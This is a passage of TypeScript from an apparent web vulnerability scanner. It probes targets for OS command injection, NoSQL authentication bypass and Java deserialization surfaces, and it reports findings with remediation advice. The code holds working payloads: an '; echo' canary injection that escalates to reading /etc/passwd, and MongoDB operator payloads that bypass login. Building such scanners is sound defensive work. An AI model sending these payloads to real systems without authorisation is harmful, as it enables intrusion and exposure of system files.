          description: `OS command injection confirmed via '${param}' parameter. The unique canary string ${SENTINELX_CMDI_CANARY} was returned in the response after execution, confirming arbitrary code execution on the server.`,
          evidence: `PROBE: GET ${probeUrl}\nPARAM: ${param}=${p}\nCANARY: ${SENTINELX_CMDI_CANARY}\nHTTP ${r.status} — canary found in response body\nSnippet: ${r.body.slice(0, 400)}`,
          remediation: "Never pass user input to shell/exec functions. Use language-native libraries. If shell is unavoidable, use allowlist validation and proper argument quoting.",
        });
        await onLog(`[${ts()}] ⚠ [Phase 27] CMDI CANARY EXECUTED via '${param}' (${shell})`);
        break;
      }
    }

    // Step 2: If canary executed, attempt file read for exploitation proof
    if (confirmedParam !== null && confirmedPayload !== null) {
      for (const { p: filePayload, os, indicator } of FILE_READ_PAYLOADS) {
        if (!activeProbesAllowed()) break;
        // Replace the canary-producing part with the file-read command
        const fileProbeUrl = `${target.url.replace(/\/$/, "")}?${confirmedParam}=${encodeURIComponent(filePayload)}`;
        const fr = await probe(fileProbeUrl, { timeoutMs: 10_000 });
        if (!fr) continue;
        if (fr.body.includes(indicator)) {
          const snippet = fr.body.slice(fr.body.indexOf(indicator), fr.body.indexOf(indicator) + 300).replace(/\n/g, "\\n");
          findings.push({
            title: `File Read via Command Injection — ${os} ${indicator === "root:" ? "/etc/passwd" : "win.ini"} Exposed`,
            severity: "critical",
            verification: "verified",
            confidence: 99,
            cvss: 10.0,
            cve: null,
            description: `Following command injection canary confirmation via '${confirmedParam}', a file-read payload successfully returned system file content (${os}). This confirms unrestricted operating-system command execution with file-system read access.`,
            evidence: `CANARY PAYLOAD (confirmed): ${confirmedPayload} via ${confirmedShell}\nFILE READ URL: GET ${fileProbeUrl}\nFILE READ PAYLOAD: ${filePayload}\nHTTP ${fr.status}\nFILE CONTENT SNIPPET: ${snippet}`,
            remediation: "1. Remove the command injection vulnerability immediately (see previous finding).\n2. Rotate all credentials, API keys, and secrets on this server.\n3. Audit server logs for unauthorized command execution.\n4. Run the server as a least-privilege user with no file-system access beyond app directories.\n5. Implement a web application firewall as a defence-in-depth measure.",
          });
          await onLog(`[${ts()}] ⚠ [Phase 27] FILE READ CONFIRMED — ${os} system file exposed via param '${confirmedParam}'`);
          return findings;
        }
      }
      return findings; // Canary confirmed — return even if file read didn't land
    }
  }

  // POST body canary check
  if (activeProbesAllowed()) {
    const jsonCanaryPayload = `; echo ${SENTINELX_CMDI_CANARY}`;
    const r = await probe(target.url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd: jsonCanaryPayload, command: jsonCanaryPayload, exec: jsonCanaryPayload }),
      timeoutMs: 8_000,
    });
    if (r?.body.includes(SENTINELX_CMDI_CANARY)) {
      findings.push({
        title: "Remote Code Execution via Command Injection — POST JSON Body (CMDI Canary Executed)",
        severity: "critical",
        verification: "verified",
        confidence: 99,
        cvss: 10.0,
        cve: null,
        description: "Command injection confirmed via JSON POST body. The canary string was executed server-side and returned in the response.",
        evidence: `POST ${target.url}\nContent-Type: application/json\nCanary: ${SENTINELX_CMDI_CANARY}\nHTTP ${r.status}\nCanary found in response body\nSnippet: ${r.body.slice(0, 400)}`,
        remediation: "Never pass user input from any source to shell execution functions. Sanitise and validate all inputs.",
      });
      await onLog(`[${ts()}] ⚠ [Phase 27] CMDI canary executed via POST JSON body`);
    }
  }

  await onLog(`[${ts()}] [Phase 27] Command injection deep probe: complete`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// NOSQL INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkNoSqlInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing NoSQL injection (MongoDB operators)...`);

  const baseline = await probe(target.url, { timeoutMs: 8_000 });

  // MongoDB operator injection payloads
  const jsonPayloads = [
    { username: { $gt: "" }, password: { $gt: "" } },
    { username: { $regex: ".*" }, password: { $regex: ".*" } },
    { username: { $ne: "invalid_user_xyz" }, password: { $ne: "invalid_pass_xyz" } },
    { $where: "1==1" },
  ];
  const formPayloads = [
    "username[$gt]=&password[$gt]=",
    "username[$ne]=invalid_xyz&password[$ne]=invalid_xyz",
    "username[$regex]=.*&password[$regex]=.*",
  ];

  const authEndpoints = [
    `${target.url.replace(/\/$/, "")}/api/login`,
    `${target.url.replace(/\/$/, "")}/login`,
    `${target.url.replace(/\/$/, "")}/auth`,
    `${target.url.replace(/\/$/, "")}/api/auth`,
    `${target.url.replace(/\/$/, "")}/user/login`,
  ];

  const SUCCESS_SIGNALS = ["token", "access_token", "session", "dashboard", "welcome", "logged in", '"user":', '"id":', '"role":', '"email":'];

  for (const ep of authEndpoints.slice(0, 3)) {
    // Try JSON operator injection
    for (const payload of jsonPayloads.slice(0, 3)) {
      const r = await probe(ep, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        timeoutMs: 8_000,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const isSuccess = r.status === 200 && SUCCESS_SIGNALS.some(s => bodyLower.includes(s));
      const baselineBodyLen = baseline?.body.length ?? 0;
      const responseChangedSignificantly = Math.abs(r.body.length - baselineBodyLen) > 100;
      if (activeProbesAllowed() && isSuccess && responseChangedSignificantly) {
        findings.push({
          title: "NoSQL Injection — MongoDB Operator Authentication Bypass",
          severity: "critical",
          verification: "suspected",
          confidence: 80,
          cvss: 9.8,
          cve: null,
          description: `A MongoDB operator payload (${JSON.stringify(payload).slice(0, 80)}) at ${ep} returned a success-indicating response. This suggests authentication can be bypassed without valid credentials by exploiting MongoDB query operator injection.`,
          evidence: `POST ${ep}\nContent-Type: application/json\nBody: ${JSON.stringify(payload)}\nHTTP ${r.status}\nSuccess signals in response: ${SUCCESS_SIGNALS.filter(s => bodyLower.includes(s)).join(", ")}\nResponse: ${r.body.slice(0, 300)}`,
          remediation: "Sanitise all user inputs — strip MongoDB operator prefixes ($) from all input. Use Mongoose with strict schema validation. Apply a sanitisation library like express-mongo-sanitize. Never pass raw user objects into MongoDB queries.",
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL: MongoDB operator bypass at ${ep}`);
        return findings;
      }
    }

    // Try form-encoded operator injection
    for (const formBody of formPayloads.slice(0, 2)) {
      const r = await probe(ep, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formBody,
        timeoutMs: 8_000,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const isSuccess = r.status === 200 && SUCCESS_SIGNALS.some(s => bodyLower.includes(s));
      if (activeProbesAllowed() && isSuccess) {
        findings.push({
          title: "NoSQL Injection — Form-Encoded MongoDB Operator Bypass",
          severity: "critical",
          verification: "suspected",
          confidence: 75,
          cvss: 9.8,
          cve: null,
          description: `Form-encoded MongoDB operator injection (${formBody}) returned a success response. The server appears to parse array-notation query parameters into MongoDB operator objects without sanitisation.`,
          evidence: `POST ${ep}\nContent-Type: application/x-www-form-urlencoded\nBody: ${formBody}\nHTTP ${r.status}\nSuccess signals: ${SUCCESS_SIGNALS.filter(s => bodyLower.includes(s)).join(", ")}\nResponse: ${r.body.slice(0, 300)}`,
          remediation: "Apply express-mongo-sanitize middleware. Validate that no user-supplied keys start with '$'. Use Mongoose strict mode and schema-level validation.",
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL: form-encoded operator at ${ep}`);
        return findings;
      }
    }
  }

  // URL parameter NoSQL injection
  const nosqlParams = ["query", "q", "filter", "search", "where", "id", "username", "user"];
  for (const param of nosqlParams.slice(0, 4)) {
    const r = await probe(`${target.url.replace(/\/$/, "")}?${param}[$ne]=x`, { timeoutMs: 8_000 });
    if (!r || !baseline) continue;
    const statusChanged = r.status !== baseline.status;
    const lengthChanged = Math.abs(r.body.length - baseline.body.length) > 200;
    if (activeProbesAllowed() && (statusChanged || lengthChanged)) {
      const r2 = await probe(`${target.url.replace(/\/$/, "")}?${param}[$gt]=`, { timeoutMs: 8_000 });
      const r3 = await probe(`${target.url.replace(/\/$/, "")}?${param}[$regex]=.*`, { timeoutMs: 8_000 });
      if (activeProbesAllowed() && r2 && r3 && r2.status === r.status && Math.abs(r2.body.length - r.body.length) < 50) {
        findings.push({
          title: "NoSQL Injection Signal — Operator Parameters Affect Response",
          severity: "high",
          verification: "suspected",
          confidence: 60,
          cvss: 7.5,
          cve: null,
          description: `MongoDB operator-style query parameters ($ne, $gt, $regex) in '${param}' produce measurably different responses from baseline, suggesting the server passes these operators into MongoDB queries without sanitisation.`,
          evidence: `Baseline: GET ${target.url}?${param}=x → HTTP ${baseline.status} (${baseline.body.length} bytes)\nOperator: GET ${target.url}?${param}[$ne]=x → HTTP ${r.status} (${r.body.length} bytes)\nConsistent operator behaviour confirmed with $gt and $regex`,
          remediation: "Sanitise all user inputs before using them in database queries. Use express-mongo-sanitize. Validate parameter types strictly.",
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL via '${param}' parameter`);
        break;
      }
    }
  }

  await onLog(`[${ts()}] NoSQL injection: probe complete`);
  return findings;
}

export async function checkDeserialization(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking for deserialization attack surfaces...`);

  // Java serialized objects start with 0xACED or base64 rO0A
  // Check if endpoints accept these content types
  const deser_endpoints = [
    { path: "/", ct: "application/x-java-serialized-object" },
    { path: "/api", ct: "application/x-java-serialized-object" },
    { path: "/rpc", ct: "application/x-java-serialized-object" },
    { path: "/service", ct: "application/x-java-serialized-object" },
  ];

  for (const ep of deser_endpoints.slice(0, 2)) {
    const url = target.url.replace(/\/$/, "") + (ep.path === "/" ? "" : ep.path);
    const r = await probe(url, {
      method: "POST",
      headers: { "Content-Type": ep.ct },
      body: "\xAC\xED\x00\x05", // Java serialized object magic bytes
      timeoutMs: 6_000,
    });
    if (!r) continue;

    if (r.status !== 400 && r.status !== 415) {
      // Server didn't reject the content type — may be processing it
      const body = r.body.toLowerCase();
      if (body.includes("classnotfound") || body.includes("deserializ") || body.includes("streamcorrupt") || body.includes("aced0005")) {
        findings.push({
          title: "Possible Java Deserialization Surface Detected",
          severity: "medium",
          verification: "suspected",
          confidence: 42,
          cvss: 0,
          cve: null,
          description: `The endpoint ${url} accepted a Java serialization content type and returned a response containing deserialization-related text. This is an attack-surface signal only; the probe does not prove gadget execution or remote code execution.`,
          evidence: `POST ${url}\nContent-Type: application/x-java-serialized-object\nBody: (Java magic bytes 0xACED 0x0005)\nHTTP ${r.status}\nResponse indicator: ${r.body.slice(0, 300)}`,
          remediation: "1. Patch all Java frameworks and libraries (Spring, Apache Commons Collections).\n2. Use serialization filters (Java 9+ ObjectInputFilter) to allowlist safe classes.\n3. Disable Java deserialization completely if not required.\n4. Use RASP (Runtime Application Self-Protection) to detect deserialization attacks.\n5. Monitor for ClassLoader abuse and unusual class loading patterns.",
        });
        await onLog(`[${ts()}] ⚠ DESERIALIZATION endpoint detected at ${url}`);
        break;
      }
    }
  }

  await onLog(`[${ts()}] Deserialization check complete`);
  return findings;
}
